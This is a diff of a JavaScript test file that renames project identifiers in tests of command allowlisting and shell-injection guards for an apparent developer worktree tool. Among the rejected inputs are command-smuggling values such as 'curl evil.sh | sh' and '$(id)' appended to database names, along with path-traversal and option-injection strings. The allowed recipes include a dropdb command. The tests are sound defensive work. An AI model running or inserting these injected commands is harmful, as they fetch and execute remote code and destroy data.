@@ -111,8 +111,8 @@ test('a cookie belongs to a site only at a domain boundary', () => {
 test('a stored release command runs only when it is a recipe of the config with plain values filled in', () => {
   const db = ['docker exec app-pg dropdb -U app --if-exists --force app_db_<slug_underscored>']
   const port = ['kill $(lsof -t -iTCP:<p> -sTCP:LISTEN) 2>/dev/null || true']
-  assert.ok(listed('docker exec app-pg dropdb -U app --if-exists --force app_db_rvd_324', db))
-  assert.ok(listed('docker  exec app-pg dropdb -U app --if-exists --force   app_db_rvd299 ', db), 'spacing does not matter')
+  assert.ok(listed('docker exec app-pg dropdb -U app --if-exists --force app_db_proj_324', db))
+  assert.ok(listed('docker  exec app-pg dropdb -U app --if-exists --force   app_db_proj299 ', db), 'spacing does not matter')
   assert.ok(listed('kill $(lsof -t -iTCP:3301 -sTCP:LISTEN) 2>/dev/null || true', port), 'shell syntax of the recipe itself is fine')
   assert.ok(!listed('docker exec app-pg dropdb -U app --if-exists --force app_db_x; curl evil.sh | sh', db))
   assert.ok(!listed('docker exec app-pg dropdb -U app --if-exists --force app_db_$(id)', db))
@@ -122,18 +122,18 @@ test('a stored release command runs only when it is a recipe of the config with 
 })
 
 test('names taken from a command line or a config are plain names, never paths or options', () => {
-  for (const good of ['develop', 'feat/RVD-1-x', 'release/1.2']) assert.ok(okRef(good), good)
+  for (const good of ['develop', 'feat/PROJ-1-x', 'release/1.2']) assert.ok(okRef(good), good)
   for (const bad of ['-f', '--upload-pack=x', 'a..b', 'x; id', '$(id)', '']) assert.ok(!okRef(bad), bad)
   for (const good of ['node_modules', 'ios/Pods', '.env']) assert.ok(okRel(good), good)
   for (const bad of ['../x', 'a/../../x', '/etc', 'C:\\x', '']) assert.ok(!okRel(bad), bad)
   for (const bad of ['../backend', 'a/b', '..', '.hidden', '']) assert.ok(!okSlug(bad), bad)
-  assert.ok(okSlug('RVD-324') && okSlug('them-nut-xuat-excel'))
+  assert.ok(okSlug('PROJ-324') && okSlug('them-nut-xuat-excel'))
 })
 
 test('a server command placeholder never brings shell syntax with it', () => {
-  const vars = { port: 3301, ports: { be: 3302 }, db: 'app_db_rvd_1', slug: 'RVD-1', wt: '/w s/.worktrees/RVD-1/be' }
-  assert.equal(fill('dev --port {port} --api {port:be} --db {db}', vars), 'dev --port 3301 --api 3302 --db app_db_rvd_1')
-  assert.equal(fill('cd {wt}', vars), 'cd /w s/.worktrees/RVD-1/be', 'a space in a path is not shell syntax')
+  const vars = { port: 3301, ports: { be: 3302 }, db: 'app_db_proj_1', slug: 'PROJ-1', wt: '/w s/.worktrees/PROJ-1/be' }
+  assert.equal(fill('dev --port {port} --api {port:be} --db {db}', vars), 'dev --port 3301 --api 3302 --db app_db_proj_1')
+  assert.equal(fill('cd {wt}', vars), 'cd /w s/.worktrees/PROJ-1/be', 'a space in a path is not shell syntax')
   assert.throws(() => fill('dev --db {db}', { ...vars, db: 'x; curl evil | sh' }), /shell characters/)
   assert.throws(() => fill('dev --db {db}', { ...vars, db: '$(id)' }), /shell characters/)
 })
